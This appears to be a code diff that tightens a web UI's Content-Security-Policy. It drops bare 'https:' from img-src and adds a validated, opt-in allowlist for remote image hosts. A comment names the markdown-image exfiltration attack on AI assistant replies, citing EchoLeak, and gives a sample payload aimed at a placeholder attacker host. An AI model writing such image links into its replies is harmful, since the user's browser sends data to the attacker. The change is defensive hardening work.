@@ -193,6 +193,13 @@ _CSP_EXTRA_CONNECT_RE = _re.compile(
 _CSP_EXTRA_FRAME_RE = _re.compile(
     r"^https?://(?:\*\.)?[A-Za-z0-9._~-]+(?::(?P<port>\d{1,5}|\*))?$"
 )
+# Validator for an opt-in img-src allowlist entry (HERMES_WEBUI_CSP_IMG_EXTRA).
+# Accepts the same http(s) origin shape as the frame-extra validator, PLUS the
+# bare scheme tokens `https:` and `http:` as an explicit opt-out escape hatch
+# for operators who deliberately want to restore wide remote-image loading.
+_CSP_EXTRA_IMG_RE = _re.compile(
+    r"^(?:https?:|https?://(?:\*\.)?[A-Za-z0-9._~-]+(?::(?:\d{1,5}|\*))?)$"
+)
 _CSP_HEADER_NAME = 'Content-Security-Policy'
 _CSP_SHARED_POLICY_TEMPLATE = (
     "default-src 'self' https://*.cloudflareaccess.com; "
@@ -201,7 +208,7 @@ _CSP_SHARED_POLICY_TEMPLATE = (
     "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://static.cloudflareinsights.com blob:; "
     "worker-src blob: 'self' https://cdn.jsdelivr.net; "
     "style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://fonts.googleapis.com; "
-    "img-src 'self' data: https: blob:; "
+    "img-src {img_src}; "
     "font-src 'self' data: https://fonts.gstatic.com; "
     "media-src 'self' data: blob:; "
     "connect-src {connect_src}; "
@@ -209,6 +216,16 @@ _CSP_SHARED_POLICY_TEMPLATE = (
     "manifest-src 'self' https://*.cloudflareaccess.com; "
     "base-uri 'self'; form-action 'self'"
 )
+# Base img-src: same-origin files, inline data: URIs (how the renderer embeds
+# generated/pasted images), and blob: — but NOT bare `https:`. A remote
+# `![alt](https://attacker/?data=…)` in an assistant reply renders as a live
+# <img> and the browser beacons to that origin on render with no tool call or
+# approval — the markdown-image exfiltration class (EchoLeak, #7941). The WebUI
+# loads no remote images of its own (CDN assets are scripts/styles, governed by
+# script-src/style-src), so default-deny here only blocks the exfil vector.
+# Operators who need remote images can allowlist specific hosts (or re-add the
+# bare `https:` scheme) via HERMES_WEBUI_CSP_IMG_EXTRA.
+_CSP_IMG_BASE = "'self' data: blob:"
 # Base frame-src: same-origin only by default (so the existing same-origin
 # dashboard/extension iframes keep working). An operator can widen it, opt-in,
 # via HERMES_WEBUI_CSP_FRAME_EXTRA — e.g. to embed a self-hosted dashboard in an
@@ -265,6 +282,48 @@ def _csp_extra_frame_src() -> str:
     return " " + " ".join(sources)
 
 
+def _valid_csp_extra_img_source(source: str) -> bool:
+    # Bare scheme tokens are an explicit opt-out escape hatch (restore wide
+    # remote images). The regex already validates port range via \d{1,5}, but
+    # re-check it here for the origin form to reject e.g. :99999.
+    if source in ("https:", "http:"):
+        return True
+    match = _CSP_EXTRA_IMG_RE.fullmatch(source)
+    if not match:
+        return False
+    # Extract a trailing :port (not the scheme colon) and range-check it.
+    tail = source.rsplit(":", 1)[-1]
+    if tail.isdigit():
+        try:
+            return 1 <= int(tail) <= 65535
+        except ValueError:
+            return False
+    return True
+
+
+def _csp_extra_img_src() -> str:
+    raw = os.getenv("HERMES_WEBUI_CSP_IMG_EXTRA", "").strip()
+    if not raw:
+        return ""
+    sources = raw.split()
+    if not sources or any(not _valid_csp_extra_img_source(src) for src in sources):
+        logger.warning("Ignoring invalid HERMES_WEBUI_CSP_IMG_EXTRA value")
+        return ""
+    return " " + " ".join(sources)
+
+
+def csp_img_extra_sources(extra_img_src: str | None = None) -> list[str]:
+    """Validated HERMES_WEBUI_CSP_IMG_EXTRA entries as a list, for the page config.
+
+    The renderer mirrors this list so a remote image outside the allowlist is
+    shown as an inert click-to-open link rather than a blocked <img>. Pass the
+    value already computed for the response's CSP header so the page and the
+    header always agree; ``None`` reads (and validates) the environment.
+    """
+    value = _csp_extra_img_src() if extra_img_src is None else extra_img_src
+    return value.split()
+
+
 def _csp_connect_src(extra_connect_src: str = "") -> str:
     return f"{_CSP_CONNECT_BASE} https://cdn.jsdelivr.net{extra_connect_src}"
 
@@ -273,26 +332,35 @@ def _csp_frame_src(extra_frame_src: str = "") -> str:
     return f"{_CSP_FRAME_BASE}{extra_frame_src}"
 
 
+def _csp_img_src(extra_img_src: str = "") -> str:
+    return f"{_CSP_IMG_BASE}{extra_img_src}"
+
+
 def _build_csp_enforced_policy(
     extra_connect_src: str | None = None,
     extra_frame_src: str | None = None,
+    extra_img_src: str | None = None,
 ) -> str:
     if extra_connect_src is None:
         extra_connect_src = _csp_extra_connect_src()
     if extra_frame_src is None:
         extra_frame_src = _csp_extra_frame_src()
+    if extra_img_src is None:
+        extra_img_src = _csp_extra_img_src()
     return _CSP_SHARED_POLICY_TEMPLATE.format(
         connect_src=_csp_connect_src(extra_connect_src),
         frame_src=_csp_frame_src(extra_frame_src),
+        img_src=_csp_img_src(extra_img_src),
     )
 
 
 def _build_csp_report_only_policy(
     extra_connect_src: str | None = None,
     extra_frame_src: str | None = None,
+    extra_img_src: str | None = None,
 ) -> str:
     return (
-        _build_csp_enforced_policy(extra_connect_src, extra_frame_src)
+        _build_csp_enforced_policy(extra_connect_src, extra_frame_src, extra_img_src)
         + "; report-uri /api/csp-report; report-to csp-endpoint"
     )
 
@@ -301,12 +369,25 @@ def _security_headers(handler):
     """Add security headers to every response."""
     extra_connect_src = _csp_extra_connect_src()
     extra_frame_src = _csp_extra_frame_src()
+    # A route that already embedded the image allowlist in its body (the app
+    # shell's window.__HERMES_CONFIG__.imgSrcExtra) pre-sets this attribute so
+    # the header and the page agree for this response; otherwise read it here.
+    # Consume it: with keep-alive one handler instance serves several requests,
+    # and a later response on the same connection must read its own value.
+    preset_img_src = getattr(handler, "_csp_extra_img_src_preset", None)
+    if preset_img_src is not None:
+        try:
+            delattr(handler, "_csp_extra_img_src_preset")
+        except AttributeError:
+            pass
+    extra_img_src = preset_img_src if isinstance(preset_img_src, str) else _csp_extra_img_src()
     handler._csp_extra_connect_src = extra_connect_src
     handler._csp_extra_frame_src = extra_frame_src
+    handler._csp_extra_img_src = extra_img_src
     handler.send_header('X-Content-Type-Options', 'nosniff')
     handler.send_header('X-Frame-Options', 'DENY')
     handler.send_header('Referrer-Policy', 'same-origin')
-    handler.send_header(_CSP_HEADER_NAME, _build_csp_enforced_policy(extra_connect_src, extra_frame_src))
+    handler.send_header(_CSP_HEADER_NAME, _build_csp_enforced_policy(extra_connect_src, extra_frame_src, extra_img_src))
     handler.send_header(
         'Permissions-Policy',
         'camera=(), microphone=(self), geolocation=(), clipboard-write=(self)'
